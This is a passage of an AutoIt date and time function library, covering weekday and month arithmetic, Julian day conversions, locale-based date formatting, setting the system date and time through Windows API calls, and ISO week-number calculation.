	$aMonthOfYear[5] = "May"
	$aMonthOfYear[6] = "June"
	$aMonthOfYear[7] = "July"
	$aMonthOfYear[8] = "August"
	$aMonthOfYear[9] = "September"
	$aMonthOfYear[10] = "October"
	$aMonthOfYear[11] = "November"
	$aMonthOfYear[12] = "December"

	Select
		Case Not StringIsInt($iMonthNum) Or Not StringIsInt($iShort)
			SetError(1)
			Return ""
		Case $iMonthNum < 1 Or $iMonthNum > 12
			SetError(1)
			Return ""
		Case Else
			Select
				Case $iShort = 0
					Return $aMonthOfYear[$iMonthNum]
				Case $iShort = 1
					Return StringLeft($aMonthOfYear[$iMonthNum], 3)
				Case Else
					SetError(1)
					Return ""
			EndSelect
	EndSelect
EndFunc   ;==>_DateMonthOfYear

;===============================================================================
;
; Description:      Returns next weekday number, based on the specified day of
;                   the week.
; Parameter(s):     $iWeekdayNum - Weekday number
; Requirement(s):   None
; Return Value(s):  On Success - Next weekday number
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateNextWeekdayNum($iWeekdayNum)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iNextWeekdayNum

	Select
		Case Not StringIsInt($iWeekdayNum)
			SetError(1)
			Return 0
		Case $iWeekdayNum < 1 Or $iWeekdayNum > 7
			SetError(1)
			Return 0
		Case Else
			If $iWeekdayNum = 7 Then
				$iNextWeekdayNum = 1
			Else
				$iNextWeekdayNum = $iWeekdayNum + 1
			EndIf

			Return $iNextWeekdayNum
	EndSelect
EndFunc   ;==>_DateNextWeekdayNum

;===============================================================================
;
; Description:      Returns next month number, based on the specified month.
; Parameter(s):     $iMonthNum - Month number
; Requirement(s):   None
; Return Value(s):  On Success - Next month number
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateNextMonthNum($iMonthNum)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iNextMonthNum

	Select
		Case Not StringIsInt($iMonthNum)
			SetError(1)
			Return 0
		Case $iMonthNum < 1 Or $iMonthNum > 12
			SetError(1)
			Return 0
		Case Else
			If $iMonthNum = 12 Then
				$iNextMonthNum = 1
			Else
				$iNextMonthNum = $iMonthNum + 1
			EndIf

			$iNextMonthNum = StringFormat( "%02d", $iNextMonthNum)
			Return $iNextMonthNum
	EndSelect
EndFunc   ;==>_DateNextMonthNum

;===============================================================================
;
; Description:      Returns next month's year, based on the specified month and
;                   year.
; Parameter(s):     $iMonthNum - Month number
;                   $iYear     - Year
; Requirement(s):   None
; Return Value(s):  On Success - Next month's year
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jeremy Landes <jlandes at landeserve dot com>
; Note(s):          None
;
;===============================================================================
Func _DateNextMonthYear($iMonthNum, $iYear)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iNextYear

	Select
		Case Not StringIsInt($iMonthNum) Or Not StringIsInt($iYear)
			SetError(1)
			Return 0
		Case $iMonthNum < 1 Or $iMonthNum > 12
			SetError(1)
			Return 0
		Case Else
			If $iMonthNum = 12 Then
				$iNextYear = $iYear + 1
			Else
				$iNextYear = $iYear
			EndIf

			$iNextYear = StringFormat( "%04d", $iNextYear)
			Return $iNextYear
	EndSelect
EndFunc   ;==>_DateNextMonthYear

;===============================================================================
;
; Description:      Split Date and Time into two separateArrays.
; Parameter(s):     $sDate format "yyyy/mm/dd[ hh:mm[:ss]]"
;                    or    format "yyyy/mm/dd[Thh:mm[:ss]]"
;                    or    format "yyyy-mm-dd[ hh:mm[:ss]]"
;                    or    format "yyyy-mm-dd[Thh:mm[:ss]]"
;                    or    format "yyyy.mm.dd[ hh:mm[:ss]]"
;                    or    format "yyyy.mm.dd[Thh:mm[:ss]]"
;                   $asDatePart[4] array that contains the Date
;                   $iTimePart[4] array that contains the Time
; Requirement(s):   None
; Return Value(s):  Always 1
; Author(s):        Jos van der Zande
; Note(s):          Its expected you first do a _DateIsValid( $sDate ) for the input
;
;===============================================================================
Func _DateTimeSplit($sDate, ByRef $asDatePart, ByRef $iTimePart)
	Local $sDateTime
	Local $x
	; split the Date and Time portion
	$sDateTime = StringSplit($sDate, " T")
	; split the date portion
	If $sDateTime[0] > 0 Then $asDatePart = StringSplit($sDateTime[1], "/-.")
	; split the Time portion
	If $sDateTime[0] > 1 Then
		$iTimePart = StringSplit($sDateTime[2], ":")
		If UBound($iTimePart) < 4 Then ReDim $iTimePart[4]
	Else
		Dim $iTimePart[4]
	EndIf
	; Ensure the arrays contain 4 values
	If UBound($asDatePart) < 4 Then ReDim $asDatePart[4]
	; update the array to contain numbers not strings
	For $x = 1 To 3
		$asDatePart[$x] = Number($asDatePart[$x])
		$iTimePart[$x] = Number($iTimePart[$x])
	Next
	Return (1)
EndFunc   ;==>_DateTimeSplit

;===============================================================================
;
; Description:      Returns the number of days since noon 4713 BC January 1.
; Parameter(s):     $Year  - Year in format YYYY
;                   $Month - Month in format MM
;                   $sDate - Day of the month format DD
; Requirement(s):   None
; Return Value(s):  On Success - Returns the Juliandate
;                   On Failure - 0  and sets @ERROR = 1
; Author(s):        Jos van der Zande / Jeremy Landes
; Note(s):          None
;
;===============================================================================
Func _DateToDayValue($iYear, $iMonth, $iDay)
	Local $i_aFactor
	Local $i_bFactor
	Local $i_cFactor
	Local $i_eFactor
	Local $i_fFactor
	Local $iJulianDate
	; Verify If InputDate is valid
	If Not _DateIsValid(StringFormat( "%04d/%02d/%02d", $iYear, $iMonth, $iDay)) Then
		SetError(1)
		Return ("")
	EndIf
	If $iMonth < 3 Then
		$iMonth = $iMonth + 12
		$iYear = $iYear - 1
	EndIf
	$i_aFactor = Int($iYear / 100)
	$i_bFactor = Int($i_aFactor / 4)
	$i_cFactor = 2 - $i_aFactor + $i_bFactor
	$i_eFactor = Int(1461 * ($iYear + 4716) / 4)
	$i_fFactor = Int(153 * ($iMonth + 1) / 5)
	$iJulianDate = $i_cFactor + $iDay + $i_eFactor + $i_fFactor - 1524.5
	return ($iJulianDate)
EndFunc   ;==>_DateToDayValue

;===============================================================================
;
; Description:      Returns the DayofWeek number for a given Date.  1=Sunday
; Parameter(s):     $Year
;                   $Month
;                   $day
; Requirement(s):   None
; Return Value(s):  On Success - Returns Day of the Week Range is 1 to 7 where 1=Sunday.
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
; Note(s):          None
;
;===============================================================================
Func _DateToDayOfWeek($iYear, $iMonth, $iDay)
	Local $i_aFactor
	Local $i_yFactor
	Local $i_mFactor
	Local $i_dFactor
	; Verify If InputDate is valid
	If Not _DateIsValid($iYear & "/" & $iMonth & "/" & $iDay) Then
		SetError(1)
		Return ("")
	EndIf
	$i_aFactor = Int((14 - $iMonth) / 12)
	$i_yFactor = $iYear - $i_aFactor
	$i_mFactor = $iMonth + (12 * $i_aFactor) - 2
	$i_dFactor = Mod($iDay + $i_yFactor + Int($i_yFactor / 4) - Int($i_yFactor / 100) + Int($i_yFactor / 400) + Int((31 * $i_mFactor) / 12), 7)
	return ($i_dFactor + 1)
EndFunc   ;==>_DateToDayOfWeek

;===============================================================================
;
; Description:      Returns the DayofWeek number for a given Date.  0=Monday 6=Sunday
; Parameter(s):     $Year
;                   $Month
;                   $day
; Requirement(s):   None
; Return Value(s):  On Success - Returns Day of the Week Range is 0 to 6 where 0=Monday.
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
; Note(s):          None
;
;===============================================================================
Func _DateToDayOfWeekISO($iYear, $iMonth, $iDay)
	Local $idow = _DateToDayOfWeek($iYear, $iMonth, $iDay)
	If @error Then
		SetError(1)
		Return ""
	EndIf
	If $idow >= 2 Then Return $idow - 2
	Return 6
EndFunc   ;==>_DateToDayOfWeekISO

;===============================================================================
;
; Description:      Add the given days since noon 4713 BC January 1 and return the date.
; Parameter(s):     $iJulianDate    - Julian date number
;                   $Year  - Year in format YYYY
;                   $Month - Month in format MM
;                   $sDate - Day of the month format DD
; Requirement(s):   None
; Return Value(s):  On Success - Returns the Date in the parameter vars
;                   On Failure - 0  and sets @ERROR = 1
; Author(s):        Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _DayValueToDate($iJulianDate, ByRef $iYear, ByRef $iMonth, ByRef $iDay)
	Local $i_zFactor
	Local $i_wFactor
	Local $i_aFactor
	Local $i_bFactor
	Local $i_xFactor
	Local $i_cFactor
	Local $i_dFactor
	Local $i_eFactor
	Local $i_fFactor
	; check for valid input date
	If $iJulianDate < 0 Or Not IsNumber($iJulianDate) Then
		SetError(1)
		Return 0
	EndIf
	; calculte the date
	$i_zFactor = Int($iJulianDate + 0.5)
	$i_wFactor = Int(($i_zFactor - 1867216.25) / 36524.25)
	$i_xFactor = Int($i_wFactor / 4)
	$i_aFactor = $i_zFactor + 1 + $i_wFactor - $i_xFactor
	$i_bFactor = $i_aFactor + 1524
	$i_cFactor = Int(($i_bFactor - 122.1) / 365.25)
	$i_dFactor = Int(365.25 * $i_cFactor)
	$i_eFactor = Int(($i_bFactor - $i_dFactor) / 30.6001)
	$i_fFactor = Int(30.6001 * $i_eFactor)
	$iDay = $i_bFactor - $i_dFactor - $i_fFactor
	; (must get number less than or equal to 12)
	If $i_eFactor - 1 < 13 Then
		$iMonth = $i_eFactor - 1
	Else
		$iMonth = $i_eFactor - 13
	EndIf
	If $iMonth < 3 Then
		$iYear = $i_cFactor - 4715    ; (if Month is January or February)
	Else
		$iYear = $i_cFactor - 4716    ;(otherwise)
	EndIf
	$iYear = StringFormat( "%04d", $iYear)
	$iMonth = StringFormat( "%02d", $iMonth)
	$iDay = StringFormat( "%02d", $iDay)
	Return $iYear & "/" & $iMonth & "/" & $iDay
EndFunc   ;==>_DayValueToDate

;===============================================================================
;
; Description:      Returns the date in the PC's regional settings format.
; Parameter(s):     $date - format "YYYY/MM/DD"
;                   $sType - :
;                      0 - Display a date and/or time. If there is a date part, display it as a short date.
;                          If there is a time part, display it as a long time. If present, both parts are displayed.
;                      1 - Display a date using the long date format specified in your computer's regional settings.
;                      2 - Display a date using the short date format specified in your computer's regional settings.
;                      3 - Display a time using the time format specified in your computer's regional settings.
;                      4 - Display a time using the 24-hour format (hh:mm).
; Requirement(s):   None
; Return Value(s):  On Success - Returns date in proper format
;                   On Failure - 0  and Set
;                                   @ERROR to:  1 - Invalid $sDate
;                                               2 - Invalid $sType
; Author(s):        Jos van der Zande <jdeb at autoitscript dot com>
; Note(s):          None...
;
;===============================================================================
Func _DateTimeFormat($sDate, $sType)
	Local $asDatePart[4]
	Local $asTimePart[4]
	Local $sTempDate = ""
	Local $sTempTime = ""
	Local $sAM
	Local $sPM
	Local $iWday
	Local $lngX
	; Verify If InputDate is valid
	If Not _DateIsValid($sDate) Then
		SetError(1)
		Return ("")
	EndIf
	; input validation
	If $sType < 0 Or $sType > 5 Or Not IsInt($sType) Then
		SetError(2)
		Return ("")
	EndIf
	; split the date and time into arrays
	_DateTimeSplit($sDate, $asDatePart, $asTimePart)
	;
	; 	Const $LOCALE_USER_DEFAULT = 0x400
	;   Const $LOCALE_SDATE = 0x1D            ;  date separator
	;   Const $LOCALE_STIME = 0x1E            ;  time separator
	;   Const $LOCALE_S1159 = 0x28            ;  AM designator
	;   Const $LOCALE_S2359 = 0x29            ;  PM designator
	; 	Const $LOCALE_SSHORTDATE = 0x1F       ;  short date format string
	; 	Const $LOCALE_SLONGDATE = 0x20        ;  long date format string
	; 	Const $LOCALE_STIMEFORMAT = 0x1003    ;  time format string

	Switch $sType
		Case 0
			; Get ShortDate format
			$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1F, "str", "", "long", 255)
			If Not @error And $lngX[0] <> 0 Then
				$sTempDate = $lngX[3]
			Else
				$sTempDate = "M/d/yyyy"
			EndIf
			;
			; Get Time format
			If $asTimePart[0] > 1 Then
				$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1003, "str", "", "long", 255)
				If Not @error And $lngX[0] <> 0 Then
					$sTempTime = $lngX[3]
				Else
					$sTempTime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 1
			; Get LongDate format
			$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x20, "str", "", "long", 255)
			If Not @error And $lngX[0] <> 0 Then
				$sTempDate = $lngX[3]
			Else
				$sTempDate = "dddd, MMMM dd, yyyy"
			EndIf
		Case 2
			; Get ShortDate format
			$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1F, "str", "", "long", 255)
			If Not @error And $lngX[0] <> 0 Then
				$sTempDate = $lngX[3]
			Else
				$sTempDate = "M/d/yyyy"
			EndIf
		Case 3
			;
			; Get Time format
			If $asTimePart[0] > 1 Then
				$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1003, "str", "", "long", 255)
				If Not @error And $lngX[0] <> 0 Then
					$sTempTime = $lngX[3]
				Else
					$sTempTime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 4
			If $asTimePart[0] > 1 Then
				$sTempTime = "hh:mm"
			EndIf
		Case 5
			If $asTimePart[0] > 1 Then
				$sTempTime = "hh:mm:ss"
			EndIf
	EndSwitch
	; Format DATE
	If $sTempDate <> "" Then
		;   Const $LOCALE_SDATE = 0x1D            ;  date separator
		$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1D, "str", "", "long", 255)
		If Not @error And $lngX[0] <> 0 Then
			$sTempTime = StringReplace($sTempTime, "/", $lngX[3])
		EndIf
		$iWday = _DateToDayOfWeek($asDatePart[1], $asDatePart[2], $asDatePart[3])
		$asDatePart[3] = StringRight("0" & $asDatePart[3], 2) ; make sure the length is 2
		$asDatePart[2] = StringRight("0" & $asDatePart[2], 2) ; make sure the length is 2
		$sTempDate = StringReplace($sTempDate, "d", "@")
		$sTempDate = StringReplace($sTempDate, "m", "#")
		$sTempDate = StringReplace($sTempDate, "y", "&")
		$sTempDate = StringReplace($sTempDate, "@@@@", _DateDayOfWeek($iWday, 0))
		$sTempDate = StringReplace($sTempDate, "@@@", _DateDayOfWeek($iWday, 1))
		$sTempDate = StringReplace($sTempDate, "@@", $asDatePart[3])
		$sTempDate = StringReplace($sTempDate, "@", StringReplace(StringLeft($asDatePart[3], 1), "0", "") & StringRight($asDatePart[3], 1))
		$sTempDate = StringReplace($sTempDate, "####", _DateMonthOfYear($asDatePart[2], 0))
		$sTempDate = StringReplace($sTempDate, "###", _DateMonthOfYear($asDatePart[2], 1))
		$sTempDate = StringReplace($sTempDate, "##", $asDatePart[2])
		$sTempDate = StringReplace($sTempDate, "#", StringReplace(StringLeft($asDatePart[2], 1), "0", "") & StringRight($asDatePart[2], 1))
		$sTempDate = StringReplace($sTempDate, "&&&&", $asDatePart[1])
		$sTempDate = StringReplace($sTempDate, "&&", StringRight($asDatePart[1], 2))
	EndIf
	; Format TIME
	If $sTempTime <> "" Then
		$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x28, "str", "", "long", 255)
		If Not @error And $lngX[0] <> 0 Then
			$sAM = $lngX[3]
		Else
			$sAM = "AM"
		EndIf
		$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x29, "str", "", "long", 255)
		If Not @error And $lngX[0] <> 0 Then
			$sPM = $lngX[3]
		Else
			$sPM = "PM"
		EndIf
		;   Const $LOCALE_STIME = 0x1E            ;  time separator
		$lngX = DllCall("kernel32.dll", "long", "GetLocaleInfo", "long", 0x400, "long", 0x1E, "str", "", "long", 255)
		If Not @error And $lngX[0] <> 0 Then
			$sTempTime = StringReplace($sTempTime, ":", $lngX[3])
		EndIf
		If StringInStr($sTempTime, "tt") Then
			If $asTimePart[1] < 12 Then
				$sTempTime = StringReplace($sTempTime, "tt", $sAM)
				If $asTimePart[1] = 0 Then $asTimePart[1] = 12
			Else
				$sTempTime = StringReplace($sTempTime, "tt", $sPM)
				If $asTimePart[1] > 12 Then $asTimePart[1] = $asTimePart[1] - 12
			EndIf
		EndIf
		$asTimePart[1] = StringRight("0" & $asTimePart[1], 2) ; make sure the length is 2
		$asTimePart[2] = StringRight("0" & $asTimePart[2], 2) ; make sure the length is 2
		$asTimePart[3] = StringRight("0" & $asTimePart[3], 2) ; make sure the length is 2
		$sTempTime = StringReplace($sTempTime, "hh", StringFormat( "%02d", $asTimePart[1]))
		$sTempTime = StringReplace($sTempTime, "h", StringReplace(StringLeft($asTimePart[1], 1), "0", "") & StringRight($asTimePart[1], 1))
		$sTempTime = StringReplace($sTempTime, "mm", StringFormat( "%02d", $asTimePart[2]))
		$sTempTime = StringReplace($sTempTime, "ss", StringFormat( "%02d", $asTimePart[3]))
		$sTempDate = StringStripWS($sTempDate & " " & $sTempTime, 3)
	EndIf
	Return ($sTempDate)
EndFunc   ;==>_DateTimeFormat

;===============================================================================
;
; Description:      Returns the the julian date in format YYDDD
; Parameter(s):     $iJulianDate    - Julian date number
;                   $Year  - Year in format YYYY
;                   $Month - Month in format MM
;                   $sDate - Day of the month format DD
; Requirement(s):   None
; Return Value(s):  On Success - Returns the Date in the parameter vars
;                   On Failure - 0  and sets @ERROR = 1
; Author(s):        Jeremy Landes / Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _DateJulianDayNo($iYear, $iMonth, $iDay)
	Local $sFullDate
	Local $aiDaysInMonth
	Local $iJDay
	Local $iCntr
	; Verify If InputDate is valid
	$sFullDate = StringFormat( "%04d/%02d/%02d", $iYear, $iMonth, $iDay)
	If Not _DateIsValid($sFullDate) Then
		SetError(1)
		Return ""
	EndIf
	; Build JDay value
	$iJDay = 0
	$aiDaysInMonth = __DaysInMonth($iYear)
	For $iCntr = 1 To $iMonth - 1
		$iJDay = $iJDay + $aiDaysInMonth[$iCntr]
	Next
	$iJDay = ($iYear * 1000) + ($iJDay + $iDay)
	Return $iJDay
EndFunc   ;==>_DateJulianDayNo

;===============================================================================
;
; Description:      Returns the date for a julian date in format YYDDD
; Parameter(s):     $iJDate  - Julian date number
; Requirement(s):   None
; Return Value(s):  On Success - Returns the Date in format YYYY/MM/DD
;                   On Failure - 0  and sets @ERROR = 1
; Author(s):        Jeremy Landes / Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _JulianToDate($iJDay)
	Local $aiDaysInMonth
	Local $iYear
	Local $iMonth
	Local $iDay
	Local $iDays
	Local $iMaxDays
	Local $sSep = "/"
	; Verify If InputDate is valid
	$iYear = Int($iJDay / 1000)
	$iDays = Mod($iJDay, 1000)
	$iMaxDays = 365
	If _DateIsLeapYear($iYear) Then $iMaxDays = 366
	If $iDays > $iMaxDays Then
		SetError(1)
		Return ""
	EndIf
	; Convert to regular date
	$aiDaysInMonth = __DaysInMonth($iYear)
	$iMonth = 1
	While $iDays > $aiDaysInMonth[ $iMonth ]
		$iDays = $iDays - $aiDaysInMonth[ $iMonth ]
		$iMonth = $iMonth + 1
	WEnd
	$iDay = $iDays
	Return StringFormat( "%04d%s%02d%s%02d", $iYear, $sSep, $iMonth, $sSep, $iDay)
EndFunc   ;==>_JulianToDate

;===============================================================================
;
; Description:      Returns the current Date and Time in the pc's format
; Parameter(s):     None
; Requirement(s):   None
; Return Value(s):  On Success - Date in pc's format
; Author(s):        Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _Now()
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, 0))
EndFunc   ;==>_Now

;===============================================================================
;
; Description:      Returns the current Date and Time in format YYYY/MM/DD HH:MM:SS
; Parameter(s):     None
; Requirement(s):   None
; Return Value(s):  On Success - Date in in format YYYY/MM/DD HH:MM:SS
; Author(s):        Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _NowCalc()
	Return (@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC)
EndFunc   ;==>_NowCalc
;===============================================================================
;
; Description:      Returns the current Date in format YYYY/MM/DD
; Parameter(s):     None
; Requirement(s):   None
; Return Value(s):  On Success - Date in in format YYYY/MM/DD
; Author(s):        Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _NowCalcDate()
	Return (@YEAR & "/" & @MON & "/" & @MDAY)
EndFunc   ;==>_NowCalcDate

;===============================================================================
;
; Description:      Returns the current Date in the pc's format
; Parameter(s):     None
; Requirement(s):   None
; Return Value(s):  On Success - Date in pc's format
; Author(s):        Jos van der Zande (Larry's idea)
; Note(s):          None
;
;===============================================================================
Func _NowDate()
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY, 0))
EndFunc   ;==>_NowDate

;===============================================================================
;
; Description:      Returns the current Date and Time in the pc's format
; Parameter(s):     None
; Requirement(s):   None
; Return Value(s):  On Success - Date in pc's format
; Author(s):        Jos van der Zande
; Note(s):          None
;
;===============================================================================
Func _NowTime($sType = 3)
	If $sType < 3 Or $sType > 5 Then $sType = 3
	Return (_DateTimeFormat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, $sType))
EndFunc   ;==>_NowTime

;===============================================================================
;
; Description:      Sets the local date of the system / computer
; Parameter(s):     $iDay 	- Day of month Values: 1-31
;                   $iMonth - Moth Values: 1-12
;                   $iYear (optional)  - Year Values: > 0 (windows might restrict this further!!)
;
; Requirement(s):   DllCall
; Return Value(s):  On Success - 1
;                   On Failure - 0 sets @ERROR = 1 and @EXTENDED (Windows API error code)
;
; Error code(s): 	http://msdn.microsoft.com/library/default.asp?url=/library/en-us/debug/base/system_error_codes.asp
;
; Author(s):        /dev/null
; Note(s):          -
;
;===============================================================================
Func _SetDate($iDay, $iMonth = 0, $iYear = 0)

	Local $iRetval, $SYSTEMTIME, $lpSystemTime

	;============================================================================
	;== Some error checking
	;============================================================================
	If $iYear = 0 Then $iYear = @YEAR
	If $iMonth = 0 Then $iMonth = @MON
	If Not _DateIsValid($iYear & "/" & $iMonth & "/" & $iDay) Then Return 1

	$SYSTEMTIME = DllStructCreate("ushort;ushort;ushort;ushort;ushort;ushort;ushort;ushort")
	$lpSystemTime = DllStructGetPtr($SYSTEMTIME)

	;============================================================================
	;== Get the local system time to fill up the SYSTEMTIME structure
	;============================================================================
	$iRetval = DllCall("kernel32.dll", "long", "GetLocalTime", "ptr", $lpSystemTime)

	;============================================================================
	;== Change the necessary values
	;============================================================================
	DllStructSetData($SYSTEMTIME, 4, $iDay)
	If $iMonth > 0 Then DllStructSetData($SYSTEMTIME, 2, $iMonth)
	If $iYear > 0 Then DllStructSetData($SYSTEMTIME, 1, $iYear)

	;============================================================================
	;== Set the new date
	;============================================================================
	$iRetval = DllCall("kernel32.dll", "long", "SetLocalTime", "ptr", $lpSystemTime)

	;============================================================================
	;== If DllCall was successfull, check for an error of the API Call
	;============================================================================
	If @error = 0 Then
		If $iRetval[0] = 0 Then
			Local $lastError = DllCall("kernel32.dll", "int", "GetLastError")
			SetExtended($lastError[0])
			SetError(1)
			Return 0
		Else
			Return 1
		EndIf
		;============================================================================
		;== If DllCall was UNsuccessfull, return an error
		;============================================================================
	Else
		SetError(1)
		Return 0
	EndIf

EndFunc   ;==>_SetDate

;===============================================================================
;
; Description:      Sets the local time of the system / computer
; Parameter(s):     $iHour 	- hour Values: 0-23
;                   $iMinute - minute Values: 0-59
;                   $iSecond (optional)  - second Values: 0-59
;
; Requirement(s):   DllCall
; Return Value(s):  On Success - 1
;                   On Failure - 0 sets @ERROR = 1 and @EXTENDED (Windows API error code)
;
; Error code(s): 	http://msdn.microsoft.com/library/default.asp?url=/library/en-us/debug/base/system_error_codes.asp
;
; Author(s):        /dev/null
; Note(s):          -
;
;===============================================================================
Func _SetTime($iHour, $iMinute, $iSecond = 0)

	Local $iRetval, $SYSTEMTIME, $lpSystemTime

	;============================================================================
	;== Some error checking
	;============================================================================
	If $iHour < 0 Or $iHour > 23 Then Return 1
	If $iMinute < 0 Or $iMinute > 59 Then Return 1
	If $iSecond < 0 Or $iSecond > 59 Then Return 1

	$SYSTEMTIME = DllStructCreate("ushort;ushort;ushort;ushort;ushort;ushort;ushort;ushort")
	$lpSystemTime = DllStructGetPtr($SYSTEMTIME)

	;============================================================================
	;== Get the local system time to fill up the SYSTEMTIME structure
	;============================================================================
	$iRetval = DllCall("kernel32.dll", "long", "GetLocalTime", "ptr", $lpSystemTime)

	;============================================================================
	;== Change the necessary values
	;============================================================================
	DllStructSetData($SYSTEMTIME, 5, $iHour)
	DllStructSetData($SYSTEMTIME, 6, $iMinute)
	If $iSecond > 0 Then DllStructSetData($SYSTEMTIME, 7, $iSecond)

	;============================================================================
	;== Set the new time
	;============================================================================
	$iRetval = DllCall("kernel32.dll", "long", "SetLocalTime", "ptr", $lpSystemTime)

	;============================================================================
	;== If DllCall was successfull, check for an error of the API Call
	;============================================================================
	If @error = 0 Then
		If $iRetval[0] = 0 Then
			Local $lastError = DllCall("kernel32.dll", "int", "GetLastError")
			SetExtended($lastError[0])
			SetError(1)
			Return 0
		Else
			Return 1
		EndIf
		;============================================================================
		;== If DllCall was UNsuccessfull, return an error
		;============================================================================
	Else
		SetError(1)
		Return 0
	EndIf

EndFunc   ;==>_SetTime

;===============================================================================
;
; Description:      Converts the specified tick amount to hours, minutes, and
;                   seconds.
; Parameter(s):     $iTicks - Tick amount
;                   $iHours - Variable to store the hours (ByRef)
;                   $iMins  - Variable to store the minutes (ByRef)
;                   $iSecs  - Variable to store the seconds (ByRef)
; Requirement(s):   None
; Return Value(s):  On Success - 1
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Marc <mrd at gmx de>
; Note(s):          None
;
;===============================================================================
Func _TicksToTime($iTicks, ByRef $iHours, ByRef $iMins, ByRef $iSecs)
	If Number($iTicks) > 0 Then
		$iTicks = Round($iTicks / 1000)
		$iHours = Int($iTicks / 3600)
		$iTicks = Mod($iTicks, 3600)
		$iMins = Int($iTicks / 60)
		$iSecs = Round(Mod($iTicks, 60))
		; If $iHours = 0 then $iHours = 24
		Return 1
	ElseIf Number($iTicks) = 0 Then
		$iHours = 0
		$iTicks = 0
		$iMins = 0
		$iSecs = 0
		Return 1
	Else
		SetError(1)
		Return 0
	EndIf
EndFunc   ;==>_TicksToTime

;===============================================================================
;
; Description:      Converts the specified hours, minutes, and seconds to ticks.
; Parameter(s):     $iHours - Hours
;                   $iMins  - Minutes
;                   $iSecs  - Seconds
; Requirement(s):   None
; Return Value(s):  On Success - Converted tick amount
;                   On Failure - 0 and sets @ERROR = 1
; Author(s):        Marc <mrd at gmx de>
;                   SlimShady: added the default time and made parameters optional
; Note(s):          None
;
;===============================================================================
Func _TimeToTicks($iHours = @HOUR, $iMins = @MIN, $iSecs = @SEC)
	;==============================================
	; Local Constant/Variable Declaration Section
	;==============================================
	Local $iTicks

	If StringIsInt($iHours) And StringIsInt($iMins) And StringIsInt($iSecs) Then
		$iTicks = 1000 * ((3600 * $iHours) + (60 * $iMins) + $iSecs)
		Return $iTicks
	Else
		SetError(1)
		Return 0
	EndIf
EndFunc   ;==>_TimeToTicks

;===============================================================================
;
; Function Name:    _WeekNumberISO()
; Description:      Find out the week number of current date OR date given in parameters
;
; Parameter(s):     $iDay    - Day value (default = current day)
;                   $iMonth    - Month value (default = current month)
;                   $iYear    - Year value (default = current year)
; Requirement(s):
; Return Value(s):  On Success     - Returns week number of given date
;                   On Failure     - returns -1  and sets @ERROR = 1 on faulty parameters values
;                   On non-acceptable weekstart value sets @ERROR = 99 and uses default (Sunday) as starting day
; Author(s):        Tuape
;                   JdeB: modified to UDF standards & Doc.
;                   JdeB: Change calculation logic.
;===============================================================================
;
Func _WeekNumberISO($iYear = @YEAR, $iMonth = @MON, $iDay = @MDAY)
	Local $idow, $iDow0101

	; Check for erroneous input in $Day, $Month & $Year
	If $iDay > 31 Or $iDay < 1 Then
		SetError(1)
		Return -1
	ElseIf $iMonth > 12 Or $iMonth < 1 Then
		SetError(1)
		Return -1
	ElseIf $iYear < 1 Or $iYear > 2999 Then
		SetError(1)
		Return -1
	EndIf

	$idow = _DateToDayOfWeekISO($iYear, $iMonth, $iDay);
	$iDow0101 = _DateToDayOfWeekISO($iYear, 1, 1);

	if ($iMonth = 1 And 3 < $iDow0101 And $iDow0101 < 7 - ($iDay - 1)) Then
		;days before week 1 of the current year have the same week number as
		;the last day of the last week of the previous year
		$idow = $iDow0101 - 1;
		$iDow0101 = _DateToDayOfWeekISO($iYear - 1, 1, 1);
		$iMonth = 12
		$iDay = 31
		$iYear = $iYear - 1
	ElseIf ($iMonth = 12 And 30 - ($iDay - 1) < _DateToDayOfWeekISO($iYear + 1, 1, 1) And _DateToDayOfWeekISO($iYear + 1, 1, 1) < 4) Then
		; days after the last week of the current year have the same week number as
		; the first day of the next year, (i.e. 1)
		Return 1;
	EndIf

	Return Int((_DateToDayOfWeekISO($iYear, 1, 1) < 4) + 4 * ($iMonth - 1) + (2 * ($iMonth - 1) + ($iDay - 1) + $iDow0101 - $idow + 6) * 36 / 256)

EndFunc   ;==>_WeekNumberISO


;===============================================================================
;
; Function Name:    _WeekNumber()
; Description:      Find out the week number of current date OR date given in parameters
;
; Parameter(s):     $iDay    - Day value (default = current day)
;                   $iMonth    - Month value (default = current month)
;                   $iYear    - Year value (default = current year)
;                   $iWeekstart - Week starts from Sunday (1, default) or Monday (2)
; Requirement(s):
; Return Value(s):  On Success     - Returns week number of given date
;                   On Failure     - returns -1  and sets @ERROR = 1 on faulty parameters values
